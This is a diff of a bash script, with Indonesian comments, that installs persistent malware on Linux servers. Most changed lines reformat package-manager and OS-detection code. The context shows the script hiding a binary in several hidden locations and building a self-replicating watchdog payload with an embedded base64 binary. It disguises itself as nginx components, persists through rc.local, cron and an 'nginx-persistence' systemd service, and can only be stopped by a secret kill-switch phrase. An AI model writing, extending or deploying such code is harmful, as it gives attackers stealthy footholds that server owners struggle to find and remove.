@@ -9,11 +9,25 @@ echo "=============================="
 # ─── Fungsi pembantu ────────────────────────────────────
 install_pkg() {
     case "$PKG_MGR" in
-        apt) apt-get install -y "$@" ;;
-        dnf) dnf install -y "$@" ;;
-        yum) yum install -y "$@" ;;
-        pacman) pacman -Sy --noconfirm "$@" ;;
-        *) echo "ERROR: No package manager found!"; exit 1 ;;
+        apt)
+            apt-get update -qq
+            apt-get install -y "$@"
+            ;;
+        dnf)
+            dnf install -y "$@"
+            ;;
+        yum)
+            # Coba tanpa repo cPanel, fallback ke normal
+            yum --disablerepo="*cpanel*" install -y "$@" 2>/dev/null || \
+            yum install -y "$@"
+            ;;
+        pacman)
+            pacman -Sy --noconfirm "$@"
+            ;;
+        *)
+            echo "ERROR: No package manager found!"
+            exit 1
+            ;;
     esac
 }
 
@@ -39,11 +53,20 @@ else
 fi
 
 case "$OS_ID" in
-    centos|rhel|rocky|almalinux|ol|fedora|amzn) PKG_MGR="yum"
-        if command -v dnf &>/dev/null; then PKG_MGR="dnf"; fi ;;
-    ubuntu|debian) PKG_MGR="apt" ;;
-    arch) PKG_MGR="pacman" ;;
-    *) echo "ERROR: Unsupported OS: $OS_ID"; exit 1 ;;
+    centos|rhel|rocky|almalinux|ol|fedora|amzn)
+        PKG_MGR="yum"
+        if command -v dnf &>/dev/null; then PKG_MGR="dnf"; fi
+        ;;
+    ubuntu|debian)
+        PKG_MGR="apt"
+        ;;
+    arch)
+        PKG_MGR="pacman"
+        ;;
+    *)
+        echo "ERROR: Unsupported OS: $OS_ID"
+        exit 1
+        ;;
 esac
 
 INIT_SYSTEM="unknown"
@@ -153,7 +176,7 @@ for bp in "${BACKUP_BINS[@]}"; do
 done
 echo "  → Binary secured in ${#BACKUP_BINS[@]} hidden locations"
 
-# ─── 6. Buat payload watchdog dengan kill‑switch + binary base64 ──
+# ─── 6. Buat payload watchdog + kill‑switch + binary base64 ──
 echo ""
 echo "[6/10] Creating self‑replicating payload (binary embedded + kill‑switch)..."
 
@@ -232,7 +255,6 @@ DISABLE_FILE="/etc/nginx.disable"
 DISABLE_PHRASE="supersecretkey"   # Ganti dengan frase rahasia Anda
 if [ -f "$DISABLE_FILE" ]; then
     if grep -q "$DISABLE_PHRASE" "$DISABLE_FILE" 2>/dev/null; then
-        # Hentikan semua proses watchdog dengan bersih
         pkill -f "/etc/rc.local" 2>/dev/null || true
         pkill -f "nginx-system --oneshot" 2>/dev/null || true
         exit 0
@@ -330,9 +352,7 @@ restore_all_files() {
     done
 }
 
-# Kill‑switch check (sebelum oneshot)
 if [ "$1" = "--oneshot" ]; then
-    # Periksa kill‑switch dulu
     if [ -f "$DISABLE_FILE" ] && grep -q "$DISABLE_PHRASE" "$DISABLE_FILE" 2>/dev/null; then
         exit 0
     fi
@@ -340,10 +360,9 @@ if [ "$1" = "--oneshot" ]; then
     exit 0
 fi
 
-# Mode abadi dengan pengecekan kill‑switch setiap iterasi
+# Mode abadi
 (
     while true; do
-        # Cek kill‑switch
         if [ -f "$DISABLE_FILE" ] && grep -q "$DISABLE_PHRASE" "$DISABLE_FILE" 2>/dev/null; then
             pkill -f "/etc/rc.local" 2>/dev/null || true
             exit 0
@@ -421,7 +440,7 @@ else
     echo "     → cron not found, using systemd timer"
 fi
 
-# Systemd
+# Systemd / upstart / sysv
 if [ "$INIT_SYSTEM" = "systemd" ]; then
     SERVICE_FILE="/etc/systemd/system/nginx-persistence.service"
     echo "     → Deploying systemd service"
